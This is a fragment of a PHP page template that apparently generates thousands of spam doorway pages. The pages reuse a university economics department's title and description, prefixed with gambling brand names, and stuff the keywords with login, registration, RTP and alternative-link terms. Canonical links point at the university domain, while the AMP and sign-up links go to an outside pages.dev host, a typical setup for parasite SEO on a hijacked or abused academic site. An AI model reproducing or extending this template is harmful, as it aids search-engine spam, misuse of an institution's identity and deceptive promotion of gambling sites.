...
$baseAuthor = $BRAND;
$URL  = "https://economics.uii.ac.id/loa/file/?360=$BRAND";
$PAGEURL = "https://economics.uii.ac.id/loa/file/?360=$BRAND";
$AMP = "https://ikanhiuputih.pages.dev/loa/file/?360=$BRAND";
$DAFTAR = "https://ikanhiuputih.pages.dev/";
$BANNER = "https://s7.gifyu.com/images/Sej2q.jpg";
$LOGO = "https://s7.gifyu.com/images/SJfgE.png";
$keyword = "$brand, login $brand, daftar $brand, situs $brand, rtp $brand, link alternatif $brand";

if ($NUMLIST >= 1 && $NUMLIST <= 21134) {
    $TITLE = "$BRAND Selamat Datang Di Jurusan Ilmu Ekonomi ";
    $DESCRIPTION = "$BRAND Jurusan Ilmu Ekonomi FBE UII berkomitmen dalam penyediaan pendidikan tinggi di berbagai jenjang mulai dari program sarjana hingga doktor. Fokus utama pengembangan keilmuan dititik beratkan pada pemahaman dan pendalaman ilmu ekonomi";
    $description = "$BRAND Jurusan Ilmu Ekonomi FBE UII berkomitmen dalam penyediaan pendidikan tinggi di berbagai jenjang mulai dari program sarjana hingga doktor. Fokus utama pengembangan keilmuan dititik beratkan pada pemahaman dan pendalaman ilmu ekonomi";
}
                  ...
                  <div class="header-title-logo">
                    <a href="<?php echo $URL ?>" data-animation-role="header-element">
                      ...
                      <img elementtiming="nbf-header-logo-desktop"
                        src="https://s7.gifyu.com/images/SJfgE.png"
